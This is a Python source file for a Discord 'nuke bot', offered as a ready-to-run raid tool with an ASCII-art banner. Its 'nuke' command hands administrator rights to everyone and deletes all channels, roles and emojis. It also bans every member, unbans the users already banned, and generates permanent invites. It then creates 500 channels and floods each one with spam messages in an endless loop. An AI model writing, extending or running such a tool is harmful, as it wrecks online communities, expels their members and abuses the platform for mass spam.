import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
th = input(Fore.RED + " {<[?]>} Enter the BOT token here >}> " + Fore.BLUE)
print(Fore.RESET)
print(Fore.YELLOW + " /{<!>}\ You entered " + Fore.BLUE + th + Fore.YELLOW + " as BOT token ")
print(Fore.RESET)
token = th
cp = input(Fore.RED + " {<[?]>} Enter your command prefix here >}> " + Fore.BLUE )
print(Fore.RESET)
print(Fore.YELLOW + " /{<!>}\ That is the command prefix you entered " + Fore.BLUE + cp + Fore.YELLOW + ' /{<!>}\ ')
print(Fore.RESET)
Ba = input(Fore.RED + " {<[?]>} Enter the BOT activity >}> " + Fore.BLUE)
print(Fore.RESET)
print(Fore.YELLOW + " /{<!>}\ This the BOT activity you entered " + Fore.BLUE + Ba + Fore.YELLOW + " /{<!>}\ ")
print(Fore.RESET)
sm = input(Fore.RED + " {<[?]>} Enter BOT a spam message that the BOT will spam in the chat >}> " + Fore.BLUE)
print(Fore.RESET)
print(Fore.YELLOW + " /{<!>}\ The message is " + Fore.BLUE + sm + Fore.YELLOW + " /{<!>}\ ")
print(Fore.RESET)
sc = input(Fore.RED + " {<[?]>} Enter the firt channel name >}> " + Fore.BLUE)
sc1 = input(Fore.RED + " {<[?]>} Enter the second channel name >}> " + Fore.BLUE)
sc2 = input(Fore.RED + " {<[?]>} Enter the third channel name >}> " + Fore.BLUE)
sc3 = input(Fore.RED + " {<[?]>} Enter the fourth channel name >}> " + Fore.BLUE)
sc4 = input(Fore.RED + " {<[?]>} Enter the fifth channel name >}> " + Fore.BLUE)
print(Fore.YELLOW + " /{<!>}\ The BOT will create channels by picking random name you have given "+Fore.BLUE+sc+Fore.YELLOW+", "+Fore.BLUE+sc+Fore.YELLOW+", "+Fore.BLUE+sc1+Fore.YELLOW+", "+Fore.BLUE+sc2+Fore.YELLOW+", "+Fore.BLUE+sc3+Fore.YELLOW+", "+Fore.BLUE+sc4+Fore.YELLOW+" /{<!>}\ ")
SPAM_CHANNEL =  [sc , sc1 , sc2 , sc3, sc4]
SPAM_MESSAGE = [sm]
client = commands.Bot(command_prefix=cp)
@client.event
async def on_ready():
  
   print('''

Created by 
  _______   __              _______   __                      __     _______                   __   
 |       | |  |--. .-----. |   _   | |  |--. .-----. .-----. |  |_  |   _   \ .-----. .-----. |  |_ 
 |.|   | | |     | |  -__| |.  |___| |     | |  _  | |__ --| |   _| |.  l   / |  _  | |  _  | |   _|
 `-|.  |-' |__|__| |_____| |.  |   | |__|__| |_____| |_____| |____| |.  _   1 |_____| |_____| |____|
   |:  |                   |:  1   |                                |:  |   |                       
   |::.|                   |::.. . |                                |::.|:. |                       
   `---'                   `-------'                                `--- ---'                       


███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░

    to start the nuke | '''+cp+'''nuke
    to stop the nuke | '''+cp+'''stoppp

 ''')

   await client.change_presence(activity=discord.Game(name=Ba))

@client.command()
@commands.is_owner()
async def stoppp(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)

    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)

    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)

    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)

    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()

    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("GAME OVER")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("NUKED")

    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
client.run(token, bot=True)
